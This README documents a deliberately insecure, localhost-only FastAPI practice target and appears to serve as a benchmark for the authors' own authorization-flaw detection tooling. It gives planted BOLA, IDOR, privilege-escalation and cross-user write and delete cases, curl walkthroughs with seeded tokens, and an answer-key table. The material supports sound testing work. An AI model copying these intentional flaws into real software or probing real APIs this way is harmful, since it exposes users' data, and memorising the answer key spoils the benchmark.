# Vulnerable Test Target

A **deliberately-insecure**, fully self-contained FastAPI app used as a local
ground-truth practice target for our own security tooling.

> ⚠️ **Localhost only. Never deploy.** Every "vulnerability" here is planted on
> purpose. There is no real auth, no crypto, and the bugs below are intentional.

It is standalone: it has its own `main.py`, its own SQLite DB, its own engine,
and its own uvicorn entrypoint on **port 8001**. It imports nothing from the
main `backend/app` package and modifies no existing file.

---

## Run it

From the **repo root**:

```bash
pip install -r vulnerable_target/requirements.txt   # deps mirror the main repo
python -m uvicorn vulnerable_target.main:app --reload --port 8001
```

Or from inside `vulnerable_target/`:

```bash
uvicorn main:app --reload --port 8001
```

Health check: <http://127.0.0.1:8001/>  ·  Interactive docs: <http://127.0.0.1:8001/docs>

On first start it creates `vulnerable_target/vulnerable_target.db` and seeds it.
Delete that file to reset. (Tests use a throwaway DB and never touch it — they
override `VULN_TARGET_DATABASE_URL`.)

---

## Seeded users (the answer key)

Three users. **Alice** and **Bob** are normal users (`role="user"`); **Carol** is
an **admin** (`role="admin"`). Each user owns one order, one profile, one
notification setting, and one avatar.

| user  | user_id | role    | token              | order_id | profile `display_name` | settings `notifications` | avatar `avatar_url`                |
|-------|---------|---------|--------------------|----------|------------------------|--------------------------|------------------------------------|
| alice | `1`     | `user`  | `alice-token-aaaa` | `1`      | `Alice`                | `email`                  | `https://avatars.local/alice.png`  |
| bob   | `2`     | `user`  | `bob-token-bbbb`   | `2`      | `Bob`                  | `sms`                    | `https://avatars.local/bob.png`    |
| carol | `3`     | `admin` | `carol-token-cccc` | `3`      | `Carol`                | `none`                   | `https://avatars.local/carol.png`  |

Order items: Alice = `Vintage Typewriter` (249.99 USD); Bob = `Mechanical Keyboard
Set + Artisan Keycaps Bundle` (1875.50 EUR); Carol = `Server Rack PDU` (540.00 USD).

Each user additionally owns one **invoice**, one **document**, one **note**, and
one **theme** (for the T-* benchmark cases). For invoices/documents/notes the
object id equals the owner's user id (so `/api/invoices/2` is Bob's):

| user  | invoice (number, amount, size) | document (title) | note `text` | theme |
|-------|--------------------------------|------------------|-------------|-------|
| alice | `INV-1001`, 49.90, **small**   | `Alice Memo`     | `Remember to buy milk` | `light` |
| bob   | `INV-2002`, 9875.40, **large** | `Bob Confidential` | `Remember to buy eggs` | `dark` |
| carol | `INV-3003`, 120.00, small      | `Carol Memo`     | `Remember to buy tea_` | `system` |

Each user also owns one **identity** (for the D18 Phase-2 cross-path cases) with a
writable `display_name` and `nickname`. There is deliberately **no GET** for either
field — the only read-back is the cross-path `GET /api/audit-log`:

| user  | identity `display_name` | identity `nickname` |
|-------|-------------------------|---------------------|
| alice | `alice_dn`              | `alice_nick`        |
| bob   | `bob_dn`               | `bob_nick`          |
| carol | `carol_dn`             | `carol_nick`        |

Each user also owns one **gizmo** and one **sprocket** (the M1.2 X-SILENT cases). Both are
written via `POST /api/users/{id}/gizmo|sprocket` with **no GET on that path**; their state is
read cross-path at `GET /api/gizmos/{id}` / `GET /api/sprockets/{id}` (id == owner id):

| user  | gizmo `code`      | sprocket `code`      |
|-------|-------------------|----------------------|
| alice | `gizmo_alice_v0`  | `sprocket_alice_v0`  |
| bob   | `gizmo_bob_v0`    | `sprocket_bob_v0`    |
| carol | `gizmo_carol_v0`  | `sprocket_carol_v0`  |

Each user also owns one **relic**, one **badge** and one **seal** (the M1.3 X-DELETE cases). All
three are deleted via `DELETE /api/users/{id}/relic|badge|seal` with **no GET on that path**; their
state is read cross-path at `GET /api/relics|badges|seals/{id}` (id == owner id). The relic is
**hard**-deleted (the row goes away → 404); the badge is **soft**-deleted (`status` flips
`active` → `revoked`); the seal is the SECURE mirror (cross-user delete dropped):

| user  | relic `label` | badge `label` / `status` | seal `label` |
|-------|---------------|--------------------------|--------------|
| alice | `relic_alice` | `badge_alice` / `active` | `seal_alice` |
| bob   | `relic_bob`   | `badge_bob` / `active`   | `seal_bob`   |
| carol | `relic_carol` | `badge_carol` / `active` | `seal_carol` |

The token maps 1:1 to a user, and the user carries a `role`, so the token
transitively **encodes which user (and thus their role)** — no crypto, this is a
target. Log in to retrieve a token (static, so this is mostly a formality):

```bash
curl -s -X POST http://127.0.0.1:8001/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice"}'
# -> {"user_id":1,"username":"alice","role":"user","token":"alice-token-aaaa"}
```

The token identifies the caller. Pass it as `Authorization: Bearer <token>` (or
`X-Token: <token>`) on the API endpoints below.

---

## Planted vulnerabilities

### Vuln A — blatant BOLA (the easy one)

`GET /api/orders/{order_id}` returns the full order but **never checks that the
order belongs to the authenticated user**. Alice's token can read Bob's order.
The two orders differ a lot (item, amount, currency), so the response **body and
length differ** between them — a single-shot size/diff oracle catches it.

**Confirm manually** — Alice reads her own order, then Bob's:

```bash
# Alice reading her OWN order (id=1) — legitimate
curl -s http://127.0.0.1:8001/api/orders/1 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"order_id":1,"owner_id":1,"item":"Vintage Typewriter","amount":249.99,"currency":"USD"}

# Alice reading BOB'S order (id=2) using HER token — BOLA: should be 403, returns 200
curl -s http://127.0.0.1:8001/api/orders/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"order_id":2,"owner_id":2,"item":"Mechanical Keyboard Set + Artisan Keycaps Bundle","amount":1875.5,"currency":"EUR"}
```

The second response has `owner_id: 2` and a clearly different body/length while
Alice is authenticated — that is the leak.

### Vuln B — silent BOLA (the hard one — the important one)

`POST /api/users/{user_id}/profile` updates a profile's `display_name` but
**never checks that `{user_id}` matches the authenticated user**, so Alice can
overwrite Bob's profile.

The catch: the response is **always exactly `200 {"status":"ok"}`** — identical
status, identical Content-Length, identical body every time, regardless of whose
profile changed (or whether anything changed at all). A single-shot, diff-based
oracle **cannot** detect this. The write only becomes observable via a **second
request**: `GET /api/users/{user_id}/profile` to read the name back.

**Confirm manually** — write-then-read against Bob, using Alice's token:

```bash
# 1. Baseline: read Bob's profile (his name is "Bob")
curl -s http://127.0.0.1:8001/api/users/2/profile -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"display_name":"Bob"}

# 2. Alice OVERWRITES Bob's profile with her token. Note the opaque response.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/profile \
  -H 'Authorization: Bearer alice-token-aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"display_name":"PWNED_BY_ALICE"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}   (same bytes as any other write)

# 3. Read Bob's profile AGAIN — the change is now visible. THIS is the oracle.
curl -s http://127.0.0.1:8001/api/users/2/profile -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"display_name":"PWNED_BY_ALICE"}
```

Step 2's response is byte-identical to a legitimate self-update, so only the
step-1-vs-step-3 read-back reveals the cross-user write. A correct tool must do
a **two-step (write-then-read) check**; a one-shot diff oracle will miss it.

> Tip: to demonstrate that the response really is invariant, run step 2 against
> Alice's own profile (`/api/users/1/profile`) and against Bob's — both return
> the exact same `200 {"status":"ok"}`.

### Vuln C — vertical privilege escalation (REAL vuln)

`GET /api/admin/users` is meant to be **admin-only** and returns the full user
roster including **every user's role** (sensitive). The bug: it checks that the
caller is authenticated but **never checks `role == "admin"`**, so Alice (a
normal user) gets the admin-only list. The response is clearly **richer than any
normal-user endpoint** — it enumerates all users and their roles — so the
privilege boundary is genuinely crossed.

**Confirm manually** — a normal user reaches an admin endpoint:

```bash
# Alice (role=user) calls the admin-only endpoint with HER token — should be 403,
# returns 200 with the full roster (including roles). THAT is the escalation.
curl -s http://127.0.0.1:8001/api/admin/users -H 'Authorization: Bearer alice-token-aaaa'
# -> {"count":3,"users":[{"id":1,"username":"alice","role":"user"},{"id":2,"username":"bob","role":"user"},{"id":3,"username":"carol","role":"admin"}]}
```

A normal user should never see other users' accounts or the `role` field. The
fact that Alice does — and learns Carol is an `admin` — is the vulnerability. (For
contrast, Carol's admin token `carol-token-cccc` returns the same list, which is
the *intended* behavior.)

### Vuln D — silent BOLA, regression case (REAL vuln, same shape as Vuln B)

`POST /api/users/{user_id}/settings` updates a user's `notifications` setting with
the **exact same flaw and shape as Vuln B**: no ownership check, always an opaque
`200 {"status":"ok"}`. The cross-user write is only observable via a follow-up
`GET /api/users/{user_id}/settings`. This is the regression check that the
write-then-read class still works on a fresh endpoint.

**Confirm manually** — write-then-read against Bob, using Alice's token:

```bash
# 1. Baseline: read Bob's setting (seeded "sms")
curl -s http://127.0.0.1:8001/api/users/2/settings -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"notifications":"sms"}

# 2. Alice OVERWRITES Bob's setting with her token. Opaque response.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/settings \
  -H 'Authorization: Bearer alice-token-aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"notifications":"PWNED_CHANNEL"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}

# 3. Read Bob's setting AGAIN — the change is visible. The write LANDED.
curl -s http://127.0.0.1:8001/api/users/2/settings -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"notifications":"PWNED_CHANNEL"}
```

Because the value **changed** on read-back, the correct verdict is **vulnerable**.

### SAFE control — a hard trap that LOOKS vulnerable but is NOT (no vuln)

`POST /api/users/{user_id}/avatar` updates a user's `avatar_url` and returns the
**same opaque `200 {"status":"ok"}`** as Vuln B/D — so on the surface it is
indistinguishable from a silent BOLA. **But the backend DOES enforce ownership:**
if `{user_id}` is not the authenticated caller's own id, the write is **silently
ignored** (no change) while **still returning `200 {"status":"ok"}`** — it
deliberately does **not** return 403. That missing 403 is what makes this a hard
trap. The write-then-read read-back shows the value was **NOT** changed.

**Confirm manually** — the cross-user write does NOT land:

```bash
# 1. Baseline: read Bob's avatar (seeded)
curl -s http://127.0.0.1:8001/api/users/2/avatar -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"avatar_url":"https://avatars.local/bob.png"}

# 2. Alice ATTEMPTS to overwrite Bob's avatar with her token. SAME opaque 200 ok.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/avatar \
  -H 'Authorization: Bearer alice-token-aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"avatar_url":"https://evil.example/pwn.png"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}   (looks identical to Vuln D!)

# 3. Read Bob's avatar AGAIN — UNCHANGED. The cross-user write was silently dropped.
curl -s http://127.0.0.1:8001/api/users/2/avatar -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"avatar_url":"https://avatars.local/bob.png"}

# 4. Sanity: the endpoint DOES work for the legitimate owner. Bob updates his own.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/avatar \
  -H 'Authorization: Bearer bob-token-bbbb' \
  -H 'Content-Type: application/json' \
  -d '{"avatar_url":"https://avatars.local/bob-new.png"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}
curl -s http://127.0.0.1:8001/api/users/2/avatar -H 'Authorization: Bearer bob-token-bbbb'
# -> {"user_id":2,"avatar_url":"https://avatars.local/bob-new.png"}   (owner write LANDS)
```

Because Alice's cross-user write did **NOT** change the value (step 3 == step 1),
the correct verdict is **NOT vulnerable** — even though step 2 returned the same
`200 {"status":"ok"}` as the real silent BOLA. A verifier that only looks at the
POST response will be fooled; a write-then-read verifier must conclude *secure*.

---

## Phase-1 benchmark additions (T-* cases)

### T-REAL — strong-signal IDOR (REAL vuln)

`GET /api/invoices/{invoice_id}` returns an invoice with **no ownership check**,
so Alice reads Bob's invoice. Bob's invoice body is clearly **larger/different**
than Alice's, so even a single-shot size/diff oracle catches it. Planted: **REAL**.

```bash
# Alice reading her OWN invoice (id=1) — small body
curl -s http://127.0.0.1:8001/api/invoices/1 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"invoice_id":1,"owner_id":1,"number":"INV-1001","amount":49.9,"details":"1x Coffee Mug"}

# Alice reading BOB'S invoice (id=2) with HER token — IDOR: 200, clearly larger body
curl -s http://127.0.0.1:8001/api/invoices/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"invoice_id":2,"owner_id":2,"number":"INV-2002","amount":9875.4,"details":"12x Standing Desk; ... net 30 terms."}
```

`owner_id:2` while Alice is authenticated, and a much larger body → real leak.

### T-TRAP — soft-200 denial (SECURE — false-positive killer)

`GET /api/documents/{document_id}` **denies** a cross-user read, but with the
common bad pattern of **HTTP 200 + `{"error":"forbidden"}`** instead of 403. The
confidential content is **never disclosed**. Planted: **SECURE** — the only flaw
is the misleading status code; there is no data exposure. A verifier must read the
body, not just the status line.

```bash
# Alice reading her OWN document (id=1) — allowed, real content returned
curl -s http://127.0.0.1:8001/api/documents/1 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"document_id":1,"owner_id":1,"title":"Alice Memo","content":"Alice private memo: lunch at noon."}

# Alice reading BOB'S document (id=2) with HER token — DENIED, but as a soft 200
curl -s -i http://127.0.0.1:8001/api/documents/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> HTTP/1.1 200 OK ... {"error":"forbidden"}   (no content leaked — NOT exploitable)
```

The status is `200` but the body is a denial and Bob's content is absent → secure.

### T-WEAK — weak-signal IDOR (REAL, faint)

`GET /api/notes/{note_id}` returns a note with **no ownership check**, so Alice
CAN read Bob's note (a real cross-user access). But every note is the same
length/shape — only the last word differs — so the size/diff signal is faint.
Planted: **REAL** (subtle).

```bash
# Alice reading her OWN note (id=1)
curl -s http://127.0.0.1:8001/api/notes/1 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"note_id":1,"owner_id":1,"text":"Remember to buy milk"}

# Alice reading BOB'S note (id=2) with HER token — IDOR, near-identical body
curl -s http://127.0.0.1:8001/api/notes/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"note_id":2,"owner_id":2,"text":"Remember to buy eggs"}
```

`owner_id:2` confirms the cross-user read; the bodies differ by only one word
(`milk` → `eggs`), so a length-threshold oracle may miss it.

### T-SILENT2 — silent BOLA, theme family (REAL)

`POST /api/users/{user_id}/theme` updates a UI theme with **no ownership check**
(real silent BOLA, same family as Vuln D), returning an opaque `200 {"status":
"ok"}`. The cross-user write is only observable via `GET /api/users/{user_id}/theme`.
Planted: **REAL**.

```bash
# 1. Baseline: read Bob's theme (seeded "dark")
curl -s http://127.0.0.1:8001/api/users/2/theme -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"theme":"dark"}

# 2. Alice OVERWRITES Bob's theme with her token. Opaque response.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/theme \
  -H 'Authorization: Bearer alice-token-aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"theme":"PWNED_THEME"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}

# 3. Read Bob's theme AGAIN — changed. The write LANDED.
curl -s http://127.0.0.1:8001/api/users/2/theme -H 'Authorization: Bearer alice-token-aaaa'
# -> {"user_id":2,"theme":"PWNED_THEME"}
```

The value **changed** on read-back → **vulnerable**.

---

## Phase-2 cross-path additions (X-* cases)

These two cases break the same-path assumption: the write lands on one path, but the
**only** way to observe it is a **different** path — `GET /api/audit-log` — never a
same-path GET. (There is intentionally no GET for display-name or nickname.) An
append-only audit row is written **only when a write actually lands**, so the
presence/absence of a row on the audit path is the ground truth.

### X-CROSS — REAL cross-path BOLA (display-name)

`POST /api/users/{user_id}/display-name` updates the identity `display_name` with
**no ownership check** (REAL vuln) and returns the same opaque `200 {"status":"ok"}`
as the other silent writes. The twist: there is **no GET for display-name** — the
cross-user write is observable **only via a DIFFERENT path**, `GET /api/audit-log`.
A landed write appends an audit row. Planted: **REAL**.

```bash
# 1. Alice OVERWRITES Bob's display_name (user_id=2) with HER token. Opaque response.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/display-name \
  -H 'Authorization: Bearer alice-token-aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"display_name":"PWNED_DN"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}

# 2. Confirm via the CROSS-PATH read-back (a different path). The write LANDED, so an
#    audit row for user_id=2 is present.
curl -s http://127.0.0.1:8001/api/audit-log -H 'Authorization: Bearer alice-token-aaaa'
# -> {"events":[{"id":1,"event":"display_name.update","user_id":2,"new_value":"PWNED_DN"}]}
```

Because the cross-user write produced an audit row on a **different** path, the
correct verdict is **vulnerable** — and a same-path-GET-only placeholder could never
have found the confirmation.

### X-SAFE — SECURE cross-path control (nickname)

`POST /api/users/{user_id}/nickname` returns the same opaque `200 {"status":"ok"}`
but ownership **is** enforced: a cross-user write is **silently dropped** (no error,
still 200) and appends **nothing** to the audit log. Only an owner's write lands and
audits. Like display-name, there is **no GET for nickname** — confirmation is
cross-path via the audit log. Planted: **NOT vulnerable**.

```bash
# 1. Alice ATTEMPTS to overwrite Bob's nickname (user_id=2) with HER token. SAME 200 ok.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/nickname \
  -H 'Authorization: Bearer alice-token-aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"nickname":"PWNED_NICK"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}   (looks identical to X-CROSS!)

# 2. Cross-path read-back: NO row for this attempt — the write was dropped.
curl -s http://127.0.0.1:8001/api/audit-log -H 'Authorization: Bearer alice-token-aaaa'
# -> {"events":[]}   (nothing appended for the dropped cross-user write)

# 3. Sanity: the owner CAN update + it audits. Bob updates his own nickname.
curl -s -i -X POST http://127.0.0.1:8001/api/users/2/nickname \
  -H 'Authorization: Bearer bob-token-bbbb' \
  -H 'Content-Type: application/json' \
  -d '{"nickname":"bob_nick2"}'
# -> HTTP/1.1 200 OK ... {"status":"ok"}
curl -s http://127.0.0.1:8001/api/audit-log -H 'Authorization: Bearer bob-token-bbbb'
# -> {"events":[{"id":1,"event":"nickname.update","user_id":2,"new_value":"bob_nick2"}]}
```

Because Alice's cross-user write produced **no** audit row (it was dropped) while the
owner's write does, the correct verdict is **NOT vulnerable** — despite the identical
`200 {"status":"ok"}`.

---

## M1.1 read-type semantic-equivalence additions (X-EQUIV cases)

A DIFFERENT shape from the write cases: the SAME underlying object is reachable via **two
equivalent read paths** — an owner-scoped canonical path and a flat resource path. The bug is
that the flat path skips the ownership check. Responses are shaped **EQUAL-LENGTH** (a real
record and a denial are the same size; identity differs only in `owner_id` and a fixed-width
36-char `account_ref` UUID), so a size/diff oracle **cannot** decide — the verdict must come
from reading the semantic content (whose object is this?).

### X-EQUIV-VULN — REAL read-type semantic-equivalence BOLA (statement)

`GET /api/statements/{statement_id}` returns a statement with **NO ownership check**, so Alice
reads Bob's. The SAME object is also reachable via the owner-scoped `GET /api/users/{user_id}/statement`.
`statement_id == owner_id` (seeded). Planted: **REAL**.

```bash
# Alice reads her OWN statement (id=1) — equal-length baseline
curl -s http://127.0.0.1:8001/api/statements/1 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":1,"owner_id":1,"account_ref":"11111111-1111-1111-1111-111111111111","period":"2026-Q1","status":"OPEN"}

# Alice reads BOB'S statement (id=2) with HER token — BOLA: 200, owner_id:2, SAME length
curl -s http://127.0.0.1:8001/api/statements/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"account_ref":"22222222-2222-2222-2222-222222222222","period":"2026-Q1","status":"OPEN"}
```

`owner_id:2` returned to Alice at the SAME body length as her own → a real cross-user read leak
that only a content (not size) reading catches. Correct verdict: **vulnerable**.

### X-EQUIV-SAFE — SECURE read-type control (ledger)

`GET /api/ledgers/{ledger_id}` mirrors the statement shape but **enforces ownership**: a
cross-user read returns an **equal-length soft-200 denial** (`owner_id:0`, a zero-UUID
`account_ref`, `status:"DENY"`) — **never a 403, never the victim's data**. Planted: **NOT
vulnerable**.

```bash
# Alice reads her OWN ledger (id=1) — real record
curl -s http://127.0.0.1:8001/api/ledgers/1 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":1,"owner_id":1,"account_ref":"11111111-1111-1111-1111-1111111111aa","period":"2026-Q1","status":"OPEN"}

# Alice reads BOB'S ledger (id=2) with HER token — DENIED, but as an equal-length soft 200
curl -s http://127.0.0.1:8001/api/ledgers/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":0,"owner_id":0,"account_ref":"00000000-0000-0000-0000-000000000000","period":"2026-Q1","status":"DENY"}
```

The status is `200` and the body is the same length as a real ledger, but `owner_id:0` +
`status:"DENY"` + the zero-UUID mean **no victim data was disclosed** → **NOT vulnerable**. The
`DENY` token is deliberately not a rule-oracle veto keyword, so this case reaches the AI verifier
(a stricter test) rather than being exonerated by the rule oracle on a keyword.

---

## M1.2 silent-write / object-STATE additions (X-SILENT cases)

Both are **silent writes with NO same-path GET** and **no audit row** — unlike X-CROSS/X-SAFE,
they are deliberately **not** recorded in `GET /api/audit-log`. The only observation point is the
object's **own state on a DIFFERENT path** (`GET /api/gizmos/{id}` / `GET /api/sprockets/{id}`).
That is what forces the engine to resolve and gather the object's state endpoint itself (M1.2(B)) —
the model does not find it unaided. The write responses are **byte-identical** between the REAL and
the SECURE case, so only the state read separates them.

### X-SILENT-VULN — REAL silent cross-path write (gizmo)

`POST /api/users/{user_id}/gizmo` has **no ownership check** (REAL) and returns the same opaque
`200 {"status":"ok"}` as the secure mirror. There is **no GET on that path** (a GET returns **405**).

```bash
# Bob's gizmo state BEFORE (Alice may read it — this is the observation channel)
curl -s http://127.0.0.1:8001/api/gizmos/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"code":"gizmo_bob_v0"}

# Alice writes a UNIQUE value into BOB'S gizmo with HER token
curl -s -X POST http://127.0.0.1:8001/api/users/2/gizmo \
  -H 'Authorization: Bearer alice-token-aaaa' -H 'Content-Type: application/json' \
  -d '{"code":"gz-unique-7c3f9a12e4b"}'
# -> {"status":"ok"}      (opaque — gives nothing away)

# The ONLY proof: the victim's own state on a DIFFERENT path now carries Alice's value
curl -s http://127.0.0.1:8001/api/gizmos/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"code":"gz-unique-7c3f9a12e4b"}     <- the write LANDED
```

### X-SILENT-SAFE — SECURE mirror (sprocket)

`POST /api/users/{user_id}/sprocket` **enforces ownership**: a cross-user write is **silently
dropped** (no change, still `200 {"status":"ok"}`, never a 403). Planted: **NOT vulnerable**.

```bash
# Alice attempts the same write against BOB'S sprocket — identical opaque response
curl -s -X POST http://127.0.0.1:8001/api/users/2/sprocket \
  -H 'Authorization: Bearer alice-token-aaaa' -H 'Content-Type: application/json' \
  -d '{"code":"gz-unique-7c3f9a12e4b"}'
# -> {"status":"ok"}      (byte-identical to X-SILENT-VULN — a single-shot oracle cannot tell)

# The state read shows the value was NEVER written — the unique value is ABSENT
curl -s http://127.0.0.1:8001/api/sprockets/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"code":"sprocket_bob_v0"}           <- UNCHANGED
```

That **absence of the unique value** is exactly what the verifier's payload-causality gate keys on:
owner-identity and caller!=owner confirm for BOTH cases, so only causality separates them. A
`verified` on X-SILENT-SAFE is a **false positive**.

---

## M1.3 delete-type additions (X-DELETE cases)

All three deletes return a **byte-identical opaque `200 {"status":"ok"}`** and have **no same-path
GET** (a GET returns 405). What separates them is only the cross-path STATE read *after* the delete
— and, crucially, the state read taken *before* it: a missing object proves a deletion only if the
object provably existed first.

### X-DELETE-VULN-HARD — REAL delete BOLA, physical removal (relic)

```bash
# BEFORE (the existence anchor): Bob's relic exists
curl -s http://127.0.0.1:8001/api/relics/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"label":"relic_bob"}

# Alice DELETES Bob's relic with HER token
curl -s -X DELETE http://127.0.0.1:8001/api/users/2/relic -H 'Authorization: Bearer alice-token-aaaa'
# -> {"status":"ok"}        (opaque — identical to the SECURE mirror)

# AFTER: the object is physically GONE
curl -s -o /dev/null -w '%{http_code}
' http://127.0.0.1:8001/api/relics/2   -H 'Authorization: Bearer alice-token-aaaa'
# -> 404
```

### X-DELETE-VULN-SOFT — REAL delete BOLA, logical/soft delete (badge)

```bash
curl -s http://127.0.0.1:8001/api/badges/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"status":"active","label":"badge_bob"}

curl -s -X DELETE http://127.0.0.1:8001/api/users/2/badge -H 'Authorization: Bearer alice-token-aaaa'
# -> {"status":"ok"}

# AFTER: still 200 — but the lifecycle field now reads a DELETED value
curl -s http://127.0.0.1:8001/api/badges/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"status":"revoked","label":"badge_bob"}
```

This is why **404 must not be the only accepted proof of vanishing** — most real APIs soft-delete.

### X-DELETE-SAFE — SECURE mirror (seal)

```bash
curl -s -X DELETE http://127.0.0.1:8001/api/users/2/seal -H 'Authorization: Bearer alice-token-aaaa'
# -> {"status":"ok"}        (byte-identical to the REAL deletes above)

# AFTER: STILL PRESENT and unchanged — the cross-user delete was dropped
curl -s http://127.0.0.1:8001/api/seals/2 -H 'Authorization: Bearer alice-token-aaaa'
# -> {"id":2,"owner_id":2,"label":"seal_bob"}
```

A `verified` here is a **false positive**. Note the caller-identity anchor confirms for the SAFE
case too (the object is still the victim's) — only the *negative assertion* separates them.

---

## Planted-truth summary (ground truth / answer key)

| case   | endpoint                              | planted truth          | how to confirm                                  |
|--------|---------------------------------------|------------------------|-------------------------------------------------|
| Vuln A | `GET /api/orders/{id}`                | **REAL** (blatant BOLA)| single-shot: Alice reads Bob's order (diff body) |
| Vuln B | `POST /api/users/{id}/profile`        | **REAL** (silent BOLA) | write-then-read: name changed                    |
| Vuln C | `GET /api/admin/users`                | **REAL** (vertical priv-esc) | normal user gets admin roster              |
| Vuln D | `POST /api/users/{id}/settings`       | **REAL** (silent BOLA) | write-then-read: setting changed                 |
| SAFE   | `POST /api/users/{id}/avatar`         | **NOT vulnerable** (secured trap) | write-then-read: value UNCHANGED      |
| T-REAL | `GET /api/invoices/{id}`              | **REAL** (strong-signal IDOR) | single-shot: Alice reads Bob's larger invoice |
| T-TRAP | `GET /api/documents/{id}`             | **NOT vulnerable** (soft-200 denial) | body is `{"error":"forbidden"}`, no content |
| T-WEAK | `GET /api/notes/{id}`                 | **REAL** (weak-signal IDOR) | Alice reads Bob's note; bodies near-identical |
| T-SILENT2 | `POST /api/users/{id}/theme`       | **REAL** (silent BOLA) | write-then-read: theme changed                |
| X-CROSS | `POST /api/users/{id}/display-name` | **REAL** (cross-path BOLA) | cross-path: `GET /api/audit-log` shows the landed write (no same-path GET) |
| X-SAFE | `POST /api/users/{id}/nickname`     | **NOT vulnerable** (cross-path secured trap) | cross-path: `GET /api/audit-log` shows NO row for the dropped cross-user write |
| X-EQUIV-VULN | `GET /api/statements/{id}`    | **REAL** (read-type semantic-equivalence BOLA) | equal-length read: attack body carries `owner_id:2` (semantics, not size) |
| X-EQUIV-SAFE | `GET /api/ledgers/{id}`       | **NOT vulnerable** (read-type secured control) | equal-length soft-200 denial: `owner_id:0`, `status:"DENY"`, zero-UUID — no victim data |
| X-SILENT-VULN | `POST /api/users/{id}/gizmo`   | **REAL** (silent write, object-STATE confirmable) | cross-path STATE: `GET /api/gizmos/{id}` carries the unique written value (no same-path GET, no audit row) |
| X-SILENT-SAFE | `POST /api/users/{id}/sprocket`| **NOT vulnerable** (silent-write secured mirror) | cross-path STATE: `GET /api/sprockets/{id}` still holds the ORIGINAL value — the unique value is ABSENT |
| X-DELETE-VULN-HARD | `DELETE /api/users/{id}/relic` | **REAL** (delete BOLA, physical) | pre-flight STATE exists → after: `GET /api/relics/{id}` 404s (no same-path GET) |
| X-DELETE-VULN-SOFT | `DELETE /api/users/{id}/badge` | **REAL** (delete BOLA, logical/soft) | pre-flight STATE `status:"active"` → after: still 200 but `status:"revoked"` |
| X-DELETE-SAFE | `DELETE /api/users/{id}/seal`  | **NOT vulnerable** (delete secured mirror) | pre-flight STATE exists → after: object STILL PRESENT, unchanged |

---

## Reset

```bash
rm vulnerable_target/vulnerable_target.db   # next start re-seeds Alice, Bob & Carol
```

## Verify automatically

```bash
pytest vulnerable_target/test_vulns.py -v
```

The suite (`test_vulns.py`, **25 tests**) automates the login + sanity checks and
the **five core cases only — A, B, C, D, and the SAFE control**:
- **Vuln A** — Alice's token reads Bob's order (single-shot diff).
- **Vuln B** — Alice overwrites Bob's name; follow-up GET confirms the change;
  the silent-BOLA POST response is byte-identical across self vs. cross writes.
- **Vuln C** — Alice (a normal user) receives the admin-only user roster.
- **Vuln D** — Alice's cross-user setting write is observable via read-back.
- **SAFE control** — Alice's cross-user avatar write is **NOT** observable via
  read-back (value unchanged) despite the identical `200 {"status":"ok"}`, while
  the legitimate owner's write *does* land.

It does **not** automate the benchmark-only cases — **T-REAL / T-TRAP / T-WEAK /
T-SILENT2** (Phase-1) or **X-CROSS / X-SAFE** (Phase-2 cross-path). Those remain
documented ground truth (the answer-key table above), exercised via the
[verification benchmark](./benchmark/README.md) (`RESULTS.md`), the manual `curl`
walkthroughs above, and the offline oracle/guard unit tests in `backend/tests/`
(`test_verdict_oracle.py`, `test_d18_b22_guard.py`) — **not** by `test_vulns.py`.
